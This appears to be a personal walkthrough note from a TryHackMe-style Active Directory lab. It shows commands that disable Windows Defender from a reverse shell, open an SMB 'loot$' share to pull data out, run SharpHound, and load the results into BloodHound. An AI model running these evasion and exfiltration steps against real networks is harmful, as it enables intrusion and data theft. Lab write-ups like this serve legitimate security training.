After [[Privilege Access to CORP Tier 2 - WRK1 and wrk2]].

We are now local administrators of the machine, but in order to be able to fully compromise the Active Directory, we need a Domain Administrator account. 

## Disable Windows Defender
- On the Reverse Shell run powershell.
	`powershell -ep bypass`
- Run the following code:
	`Set-MpPreference -DisableRealtimeMonitoring $true`
## Map the Active Directory in Bloodhound
### Create a new share folder to exfiltrate information.
1. In order to exfiltrate the information from the machine, create a share folder pointing to the Downloads directory, by issuing the following command on Powershell:
	 `New-SMBShare -name "loot$" -path "c:\users\laura.wood\Downloads" -FullAccess "laura.wood@corp.thereserve.loc"`
		Name  ScopeName Path                          Description
		----  --------- ----                                    -----------
		loot$ *                      c:\users\laura.wood\Downloads
2. Access the folder through smbclient and retrieve data from our tools on your Kali Machine run:
	`smbclient \\\\10.200.X.22\\loot$ -U laura.wood@corp.thereserve.loc`
		smb: \>

## Getting loot w/ SharpHound
### Upload SharpHound.ps1 from the Kali Machine
`smb: \>put SharpHound.ps1`

### Run SharpHound.exe on Powershell
`\SharpHound.exe  --CollectionMethods All` 

![[Domain Escalation-20240525135655837.webp]]
> This action will create a zip file.

### Download to the Kali Machine the zip file
`smb: \>get <fileNama>.zip`


## BloodHound Installation

Note: Run the following steps on the Kali Machine.
https://neo4j.com/docs/operations-manual/current/authentication-authorization/password-and-user-recovery/
  
1. Run the following code on the Kali terminal.
	`neo4j console`
 
2. BloodHound 3.x.x is the version used for tryhackme. You can download it from [here](https://github.com/BloodHoundAD/BloodHound/releases/tag/4.1.0). 
3. Download version of the BloodHound GUI from [https://github.com/BloodHoundAD/BloodHound/releases/tag/3.0.5](https://github.com/BloodHoundAD/BloodHound/releases/tag/3.0.5).
4. Unzip the folder.
5. Run BloodHound.
	`./BloodHound --no-sandbox`
	 - Authenticate with the credentials you set up for neo4j.5. bloodhound - default credentials -> neo4j:neo4j
    

	**![](https://lh7-us.googleusercontent.com/3CFfmT79yd1CqyOWo1SQG3NzdqfxzbMP3wJvM12FZEWHNfyX6maAyPRAwZN6cVVjKveIbMSBrsRzdL2itO52A-sUjTV_4Bxr-iwNy7o4ggF1iLz48gr1tSvpXoy0Bc3zsAxvC0R_B52SpdEY8ynD3iQ)**

6. After changing the password go back to bloodhound.

### Import the zip file to Bloodhound
Inside of Bloodhound search for this icon ![](https://lh7-us.googleusercontent.com/Y1BGpDxWmPoNB4AI3ajpCT4xESRuZXP0KO3O2RyurpD04873Kv-YsrAeGrjZo9lR8r11QQevbPE1FlkQPbZo9NAIR1fJBvCj3ETow_nETK74iUxkD10XALLPVc30gidmHccp2536hLQ5Y_9quizRDmU) and import the .zip file.

Note: On some versions of BloodHound the import button does not work. To get around this simply drag and drop the .zip file to folder into Bloodhound to import the .json files.

### Clear Database
If you want to change database or clear the database go to Database->Info and at the bottom of the list you have the buttons to do it.
![[clear_database.png]]

## Kerberos Accounts

![[kerberos_accounts.png]]

